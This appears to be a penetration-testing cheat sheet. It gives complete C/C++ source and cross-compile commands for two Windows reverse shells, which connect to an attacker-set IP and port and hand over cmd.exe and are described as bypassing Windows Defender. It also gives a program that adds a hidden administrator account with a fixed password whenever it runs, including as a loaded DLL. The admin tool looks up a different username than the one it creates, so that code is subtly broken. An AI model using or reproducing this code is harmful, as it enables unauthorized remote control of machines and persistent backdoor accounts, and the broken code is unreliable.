# EXE Files

## Reverse Shell

Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target. The IP and PORT need to be specified statically in the file before compilation.

### 1) Code

    #include <winsock2.h>
    #include <windows.h>
    #include <ws2tcpip.h>
    #include <stdio.h>
    
    #pragma comment(lib, "ws2_32.lib")
    
    // Function to handle the reverse shell
    DWORD WINAPI ReverseShell(LPVOID lpParam) {
        SOCKET sock = *(SOCKET*)lpParam;
    
        // Redirect standard input, output, and error to the socket
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
        // Create a mutable copy of the command string
        char cmd[] = "cmd.exe";
    
        // Create a new cmd.exe process with the redirected handles
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);
    
        // Clean up
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(sock);
    
        return 0;
    }
    
    int main() {
        WSADATA wsaData;
        SOCKET sock;
        struct sockaddr_in server;
        char ip[] = "192.168.1.100"; // Replace with your IP address
        int port = 4444;             // Replace with your port
    
        // Initialize Winsock
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    
        // Create socket
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
        // Define server address
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, ip, &server.sin_addr.s_addr);
    
        // Connect to server
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            printf("Connection failed!\n");
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    
        // Create a new thread for the reverse shell
        HANDLE thread = CreateThread(NULL, 0, ReverseShell, &sock, 0, NULL);
        if (thread == NULL) {
            printf("Failed to create thread!\n");
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    
        // Optionally, wait for the thread to finish (or perform other tasks)
        WaitForSingleObject(thread, INFINITE);
    
        // Clean up
        CloseHandle(thread);
        WSACleanup();
    
        return 0;
    }

### 2) Compile with Linux

    x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++

### 3) Execution

    .\rev.exe

## Alternative reverse shell

Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target. The IP and PORT need to be specified statically in the file before compilation.

### 1) Code

    #include <winsock2.h>
    #include <windows.h>
    #include <ws2tcpip.h>
    #include <stdio.h>
    
    #pragma comment(lib, "ws2_32.lib")
    
    // Function to handle the reverse shell
    DWORD WINAPI ReverseShell(LPVOID lpParam) {
        SOCKET sock = *(SOCKET*)lpParam;
    
        // Redirect standard input, output, and error to the socket
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
        // Create a mutable copy of the command string
        char cmd[] = "cmd.exe";
    
        // Create a new cmd.exe process with the redirected handles
        if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            printf("CreateProcess failed. Error: %d\n", GetLastError());
            closesocket(sock);
            return 1;
        }
    
        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);
    
        // Clean up the process
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    
        // Close the socket
        closesocket(sock);
    
        return 0;
    }
    
    int main(int argc, char* argv[]) {
        // Check if the correct number of arguments is provided
        if (argc != 3) {
            printf("Usage: %s <IP> <Port>\n", argv[0]);
            return 1;
        }
    
        // Parse IP and port from command-line arguments
        const char* ip = argv[1];
        int port = atoi(argv[2]);
    
        WSADATA wsaData;
        SOCKET sock;
        struct sockaddr_in server;
    
        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            printf("WSAStartup failed.\n");
            return 1;
        }
    
        // Create socket
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            printf("Socket creation failed.\n");
            WSACleanup();
            return 1;
        }
    
        // Define server address
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        if (inet_pton(AF_INET, ip, &server.sin_addr.s_addr) <= 0) {
            printf("Invalid IP address.\n");
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    
        // Connect to server
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            printf("Connection failed.\n");
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    
        // Create a new thread for the reverse shell
        HANDLE thread = CreateThread(NULL, 0, ReverseShell, &sock, 0, NULL);
        if (thread == NULL) {
            printf("Failed to create thread.\n");
            closesocket(sock);
            WSACleanup();
            return 1;
        }
    
        // Wait for the reverse shell thread to finish
        WaitForSingleObject(thread, INFINITE);
    
        // Clean up the thread handle
        CloseHandle(thread);
    
        // Clean up Winsock
        WSACleanup();
    
        return 0;
    }

### 2) Compile with Linux

    x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++

### 3) Execution

    .\rev.exe IP PORT

## Add New Admin

 It will create a new admin user: amit:Password123!

 ### 1) Code

     /*
     * ADDUSER.C: creating a Windows user programmatically.
     */
    
    #define UNICODE
    #define _UNICODE
    
    #include <windows.h>
    #include <string.h>
    #include <Lmaccess.h>
    #include <lmerr.h>
    #include <Tchar.h>
    
    
    DWORD CreateAdminUserInternal(void)
    {
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;
    
    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;
    
    DWORD cbSid = 256;	// 256 bytes should be enough for everybody :)
    BYTE Sid[256];
    
    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];
    
        //
        // Create user
        // http://msdn.microsoft.com/en-us/library/aa370649%28v=VS.85%29.aspx
        //
    
        memset(&ud, 0, sizeof(ud));
    
        ud.usri1_name		= _T("amit");						// username
        ud.usri1_password	= _T("Password123!");				// password
        ud.usri1_priv		= USER_PRIV_USER;					// cannot set USER_PRIV_ADMIN on creation
        ud.usri1_flags		= UF_SCRIPT | UF_NORMAL_ACCOUNT;	// must be set
        ud.usri1_script_path = NULL;
    
        rc = NetUserAdd(
            NULL,			// local server
            1,				// information level
            (LPBYTE)&ud,
            NULL			// error value
        );
    
        if (rc != NERR_Success) {
            _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
            return rc;
        }
    
        //
        // Get user SID
        // http://msdn.microsoft.com/en-us/library/aa379159(v=vs.85).aspx
        //
    
        b = LookupAccountName(
            NULL,			// local server
            _T("audit"),	// account name
            Sid,			// SID
            &cbSid,			// SID size
            Domain,			// Domain
            &cbDomain,		// Domain size
            &snu			// SID_NAME_USE (enum)
        );
    
        if (!b) {
            dw = GetLastError();
            _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
            return dw;
        }
    
        //
        // Add user to "Administrators" local group
        // http://msdn.microsoft.com/en-us/library/aa370436%28v=VS.85%29.aspx
        //
    
        memset(&gd, 0, sizeof(gd));
    
        gd.lgrmi0_sid = (PSID)Sid;
    
        rc = NetLocalGroupAddMembers(
            NULL,					// local server
            _T("Administrators"),
            0,						// information level
            (LPBYTE)&gd,
            1						// only one entry
        );
    
        if (rc != NERR_Success) {
            _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
            return rc;
        }
    
        return 0;
    }
    
    //
    // DLL entry point.
    //
    
    BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            CreateAdminUserInternal();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    
    //
    // RUNDLL32 entry point.
    // https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface
    //
    
    #ifdef __cplusplus
    extern "C" {
    #endif
    
    __declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
    {
        CreateAdminUserInternal();
    }
    
    #ifdef __cplusplus
    }
    #endif
    
    //
    // Command-line entry point.
    //
    
    int main()
    {
        return CreateAdminUserInternal();
    }

### 2) Compilation

32-bits

    i686-w64-mingw32-gcc -oadduser32.exe adduser.c -lnetapi32

64-bits

    x86_64-w64-mingw32-gcc -oadduser64.exe adduser.c -lnetapi32
